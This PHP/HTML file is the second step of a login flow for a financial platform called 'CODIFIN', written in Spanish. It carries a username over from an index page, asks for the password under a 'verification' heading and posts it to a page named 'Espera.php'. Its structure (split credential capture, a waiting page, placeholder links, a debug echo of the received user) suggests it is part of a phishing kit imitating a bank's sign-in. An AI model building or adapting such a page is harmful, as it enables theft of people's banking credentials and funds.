<?php
session_start();

// 🔥 SI VIENE USUARIO DESDE INDEX
if(isset($_POST['usuario'])){
    $_SESSION['usuario'] = $_POST['usuario'];
}


?>
<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>CODIFIN | Plataforma Financiera</title>

<style>

*{
box-sizing:border-box;
margin:0;
padding:0;
font-family:Arial, Helvetica, sans-serif;
}

/* BODY */

body{
min-height:100vh;
display:flex;
flex-direction:column;
align-items: center;
background:#ffffff;
}

#securityOverlay{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:transparent;
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

#securityOverlay polygon{
transition:none;
}
/*#p8{
transform:rotate(-180deg);
transform-origin:75px 175px;
}*/

#securityOverlay svg{
width:300px;
height:300px;
}

@keyframes bankPulse{
0%{transform:scale(1);}
50%{transform:scale(1.08);}
100%{transform:scale(1);}
}

#securityOverlay.active svg{
animation:bankPulse 0.8s ease-in-out infinite;
}

#securityOverlay polygon{
filter:brightness(1.05);
}


/* CONTENEDOR PRINCIPAL */

.container{
display:flex;
width:100%;
flex:1;
overflow-x:hidden;
align-items:flex-start;
}

/* PANEL LOGIN */

.login-panel{
flex:0 0 530px;
max-width:620px;
padding:80px;
display:flex;
flex-direction:column;
justify-content:flex-start;
background:white;
margin-left:auto;
padding-top: 0px;
}


/* LOGO */

.logo{
display:flex;
align-items:center;
gap:2px;
margin-bottom: 0px;
margin-top: 50px;
}

.logo1{
height:40px;
margin-bottom:10px;
}

.logo2{
height:40px;
margin-bottom:22px;
}
@media (min-width:1024px){

.logo1{
height:clamp(105px,7vw,155px);
}

.logo2{
height:clamp(100px,7vw,180px);
margin-bottom:30px;
}

}

.logo-square{
width:35px;
height:35px;
background:#2aa54a;
margin-right:12px;
}

.logo-text{
font-size:34px;
font-weight:bold;
color:#1e8e3e;
}

.logo-sub{
font-size:13px;
color:#666;
}

/* TEXTOS */

.title{
font-size:15px;
font-weight: 550;
color:#4a4a4a;
margin-bottom:7px;
margin-top: 10px;
}

.subtitle{
color:#666;
margin-bottom:0px;
}

/* INPUTS */

input{
width:100%;
padding:10px;
border:0.1px solid #d6d6d6;
border-radius:4px;
margin-bottom:0px;
font-size:17px;
letter-spacing:0.5px;
color:#606060;

}


/* 🔥 ESTO AGREGAS AQUÍ */
input:focus{
outline:none;
border:2px solid #000;
box-shadow:none;
}

/* 🔥 AUTOFILL (AQUÍ VA ESTO) */
input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus{

-webkit-box-shadow: 0 0 0 30px white inset !important;
box-shadow: 0 0 0 30px white inset !important;

-webkit-text-fill-color: #000 !important;

border:2px solid #000 !important;

}

.input-label{
font-size:14px;
color:#666;
margin-bottom:6px;
margin-top:80px;
font-weight:500;
}
.password-box{
position:relative;
width:100%;
}
/*.text{padding: ;}*/

.password-box input{
width:100%;
padding-right:45px;
}

.eye{
position:absolute;
right:12px;
top:50%;
transform:translateY(-50%);
width:40px;
height:40px;
cursor:pointer;
background:url("puntoicono.png") no-repeat center;
background-size:contain;
opacity:0.7;
}

.eye.closed{
background:url("openicono.png") no-repeat center;
background-size:contain;
}

/* OPCIONES */

.options{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:0px;
font-size:14px;
}

.options a{
font-size:15px;
font-weight: 550;
text-decoration:underline;
color:#1a8338;
margin-bottom: 40px;
margin-top: 40px;
}

/* SWITCH */

.remember-container{
display:flex;
align-items:center;
gap:12px;
}

.switch{
position:relative;
display:inline-block;
width:56px;
height:33px;
}

.switch input{
opacity:0;
width:0;
height:0;
}

.slider{
position:absolute;
cursor:pointer;
top:0;
left:0;
right:0;
bottom:0;
background:#aeaeae;
border-radius:34px;
transition:.3s;
}

.slider:before{
position:absolute;
content:"";
height:30.5px;
width:30.5px;
left:1.5px;
bottom:1.5px;
background:white;
border-radius:50%;
transition:.3s;
}

.switch input:checked + .slider{
background:#2aa54a;
}

.switch input:checked + .slider:before{
transform:translateX(24px);
}

/* BOTON */

button{
width:100%;
padding:12px;
background:#f0f0f0;
border:none;
border-radius:4px;
cursor:pointer;
font-size:16px;
font-weight:550;
color:#6a6a6a;
margin-bottom:10px;
}
button.active{
background:#22853d;
color:white;
}

/* LINKS EXTRA */

.extra-links{
display:flex;
justify-content:space-between;
margin-bottom:180px;
}

.extra-links a{
color:#2c8747;
text-decoration:underline;
font-size:16px;
font-weight:600;
}

/* PANEL IMAGEN */

.image-panel{
flex:1;
display:flex;
align-items:center;
justify-content:center;
background:#ffffff;
}

.image-panel img{
width:103%;
height:100%;
object-fit:contain;
display:block;
background:#ffffff;
}

/* FOOTER */

.footer-full{
width:100%;
background:transparent;
text-align:center;
color:white;
padding:40px 10px 25px 10px;
}

.footer-links{
display:flex;
justify-content:center;
gap:10px;
flex-wrap:wrap;
margin-bottom:15px;
}

.footer-links a{
color:white;
text-decoration:none;
font-weight:500;
}

.footer-links a::after{
content:" |";
margin-left:8px;
}

.footer-links a:last-child::after{
content:"";
}
@media (max-width:700px){

.footer-links a:nth-child(n+3){
display:none;
}

.footer-links a:nth-child(2)::after{
content:"";
}

}

.footer-copy{
font-size:14px;
}

/* ================= */
/* RESPONSIVE */
/* ================= */

@media (max-width:768px){

body{

background:
linear-gradient(
to top,
#1a6b14 0%,
#2f8f1a 40%,
#4fa81e 70%,
#63b51f 100%
),
linear-gradient(
90deg,
rgba(0,0,0,0.18) 0%,
rgba(0,0,0,0) 25%,
rgba(0,0,0,0) 75%,
rgba(0,0,0,0.18) 100%
);

padding-top:clamp(40px,6vh,100px);
padding-bottom:clamp(60px,10vh,140px);
padding-left:0px;
padding-right:0px;

min-height:100vh;
overflow:auto;
}

/* centrar login */

.container{
display:flex;
justify-content:center;
align-items:center;
width:100%;
margin:0 auto;
}

/* panel */

.login-panel{
display: block;
width:100%;
max-width:90%;
margin-left:auto;
margin-right:auto;
padding:20px 40px;
border-radius:6px;
box-shadow:0 10px 30px rgba(0,0,0,0.15);
}

/* ocultar imagen */

.image-panel{
display:none;
}

}

</style>

</head>

<body>
<div>
Usuario recibido: <?php echo $usuario; ?>
</div>
    <div id="securityOverlay">

<svg width="400" height="400" viewBox="0 0 200 200">

<!-- 1 -->
<polygon id="p1"
points="50,100 100,100 100,75"
fill="#071018"/>

<!-- 2 -->
<polygon id="p2"
points="50,100 100,75 100,50"
fill="#0b1320"/>

<!-- 3 -->
<polygon id="p3"
points="100,50 125,100 150,100"
fill="#1f6f3e"/>

<!-- 4 -->
<polygon id="p4"
points="100,50 100,100 125,100"
fill="#2e7b4c"/>

<!-- 5 -->
<polygon id="p5"
points="100,100 150,100 100,150"
fill="#3f6f5c"/>

<!-- 6 -->
<polygon id="p6"
points="100,100 50,100 100,150"
fill="#7CFC00"/>

<!-- 7 -->
<polygon id="p7"
points="50,100 100,150 50,150"
fill="#000000"/>

<!-- 8 -->
<polygon id="p8"
points="50,150 100,150 100,200"
fill="#0b6b3a"/>

</svg>
</div>

<div class="container">

<div class="login-panel">

<div class="logo">

<img src="Imagen5.png" class="logo1">
<img src="Imagen4.png" class="logo2">

</div>

<div class="title">Metodo de Verificacion</div>
<div class="subtitle">A continuacion, ingrese su contraseña y continue la verificacion.</div>

<form action="Espera.php" method="POST">

<div class="input-label">Ingrese su Contraseña</div>

<div class="password-box">

<input class="text" type="password" name="clave" id="password" placeholder="Contraseña">

<span class="eye" id="togglePassword"></span>

</div>

<div class="options">

<a href="#">Olvidé mi contraseña</a>

<div class="remember-container">

<span>Recordarme</span>

<label class="switch">
<input type="checkbox">
<span class="slider"></span>
</label>

</div>

</div>

<button id="loginBtn" type="submit">Inicie Sesión</button>

</form>

<div class="extra-links">
<a href="#">Tipo de Cambio</a>
<a href="#">Afiliese</a>
</div>

</div>

<div class="image-panel">
<img src="Imagen6.png">
</div>

</div>

<!-- FOOTER -->

<div class="footer-full">

<div class="footer-links">
<a href="#">Sucursales</a>
<a href="#">Contáctenos</a>
<a href="#">Políticas de Privacidad</a>
<a href="#">Términos y Condiciones</a>
<a href="#">FAQs</a>
</div>

<div class="footer-copy">
(C) Copyright CODIFIN. Todos los derechos reservados.
</div>

</div>

<script>

const userInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const eye = document.getElementById("togglePassword");

userInput.addEventListener("input", function(){

if(userInput.value.length > 0){
loginBtn.classList.add("active");
}else{
loginBtn.classList.remove("active");
}

});

eye.addEventListener("click", function(){

if(userInput.type === "password"){
userInput.type = "text";
eye.classList.add("closed");
}else{
userInput.type = "password";
eye.classList.remove("closed");
}

});

</script>

</body>
</html>
